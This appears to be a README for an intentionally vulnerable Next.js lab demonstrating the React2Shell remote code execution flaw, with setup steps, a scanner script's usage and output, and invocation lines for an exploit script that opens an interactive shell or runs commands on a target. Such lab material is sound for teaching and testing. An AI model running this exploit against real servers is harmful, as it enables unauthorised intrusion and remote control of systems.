# React2Shell Vulnerable Application

This is an intentionally vulnerable Next.js application designed for educational purposes to demonstrate the React2Shell vulnerability (CVE-2025-55182 / CVE-2025-66478).

## Vulnerability Details

- **CVE**: CVE-2025-55182 / CVE-2025-66478
- **Affected Versions**:
  - React: 19.0.0, 19.1.0, 19.1.1, 19.2.0
  - Next.js: 15.x, 16.x (with App Router)
- **Type**: Remote Code Execution (RCE) via unsafe deserialization in React Server Components

## Prerequisites

- Docker and Docker Compose installed

## Quick Start

Build and Run The Vulnerable Application
```bash
git clone http://www.github.com/rootandbeer/react2shell
cd react2shell
docker compose -f vulnerable-app/docker-compose.yml up --build -d
```
The vulnerable web application will be available at `172.16.238.129:3000`

## Scanning For the Vulnerability

Use the included `react2scan.sh` script to test for the vulnerability:

```bash
# From the parent directory
./react2scan.sh 172.16.238.129 -p 3000

# Or if running on a different host/port
./react2scan.sh <hostname-or-ip> -p <port>
```

Vulnerable hosts show the output:
```shell
$ ./react2scan.sh 172.16.238.129 -p 3000
[*] React2Shell Detection Probe (CVE‑2025‑55182 / CVE‑2025‑66478)
[*] https://www.rootandbeer.com

[*] Default Port: 8443

[*] Scanning single host
[*] Target: http://172.16.238.129:3000
[!] VULNERABLE
```

## Exploitation

Use `react2shell_exploit.py` to get an interactive shell on vulnerable targets:

**Interactive shell**
```bash
# Interactive shell
python3 react2shell_exploit.py http://172.16.238.129:3000
```

\
Single Command Execution
```shell
python3 react2shell_exploit.py http://172.16.238.129:3000 -c "whoami"
```

The script auto-installs dependencies and supports persistent directory changes.

## References

- CVE-2025-55182
- CVE-2025-66478
- [Microsoft Security Blog - React2Shell](https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/)

